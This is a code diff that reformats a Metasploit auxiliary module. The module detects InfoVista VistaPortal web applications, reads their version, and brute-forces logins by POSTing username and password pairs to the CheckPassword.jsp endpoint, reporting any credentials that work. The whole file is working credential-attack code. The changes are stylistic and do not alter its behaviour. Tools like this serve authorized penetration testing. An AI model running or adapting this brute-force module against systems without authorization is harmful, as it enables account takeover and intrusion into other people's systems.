@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,35 +8,34 @@ require 'rex/proto/http'
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'InfoVista VistaPortal Application Bruteforce Login Utility',
-      'Description'    => %{
-        This module attempts to scan for InfoVista VistaPortal Web Application, finds its
-      version and performs login brute force to identify valid credentials.
-      },
-      'Author'         =>
-        [
-          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
-        ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' => { 'SSL' => true }
-    ))
+                      'Name'           => 'InfoVista VistaPortal Application Bruteforce Login Utility',
+                      'Description'    => %(
+                        This module attempts to scan for InfoVista VistaPortal Web Application, finds its
+                      version and performs login brute force to identify valid credentials.
+                      ),
+                      'Author'         =>
+                        [
+                          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DefaultOptions' => { 'SSL' => true }))
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('TARGETURI', [true, "URI for Web login. Default: /VPortal/mgtconsole/CheckPassword.jsp", "/VPortal/mgtconsole/CheckPassword.jsp"])
-      ], self.class)
+      ], self.class
+    )
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless is_app_infovista?
       print_error("#{rhost}:#{rport} - Application does not appear to be InfoVista VistaPortal. Module will not continue.")
       return
@@ -55,14 +55,13 @@ class MetasploitModule < Msf::Auxiliary
   #
   def is_app_infovista?
     res = send_request_cgi(
-    {
-      'uri'       => '/VPortal/',
-      'method'    => 'GET'
-    })
+      'uri' => '/VPortal/',
+      'method' => 'GET'
+    )
 
-    if (res and res.code == 200 and res.body =~ /InfoVista.*VistaPortal/)
+    if res && (res.code == 200) && res.body =~ /InfoVista.*VistaPortal/
       version_key = /PORTAL_VERSION = (.+)./
-      version = res.body.scan(version_key).flatten[0].gsub('"','')
+      version = res.body.scan(version_key).flatten[0].delete('"')
       print_good("#{rhost}:#{rport} - Application version is #{version}")
       return true
     else
@@ -113,17 +112,16 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
-      {
-        'uri'       => target_uri.to_s,
+        'uri' => target_uri.to_s,
         'method'    => 'POST',
         'vars_post' =>
-          {
-            'Login' => user,
-            'password' => pass
-          }
-      })
+    {
+      'Login' => user,
+      'password' => pass
+    }
+      )
 
-      if (not res or res.code != 200 or res.body !~ /location.href.*AdminFrame\.jsp/)
+      if !res || (res.code != 200) || res.body !~ /location.href.*AdminFrame\.jsp/
         vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect} with code #{res.code}")
       else
         print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
@@ -136,5 +134,4 @@ class MetasploitModule < Msf::Auxiliary
       return :abort
     end
   end
-
 end
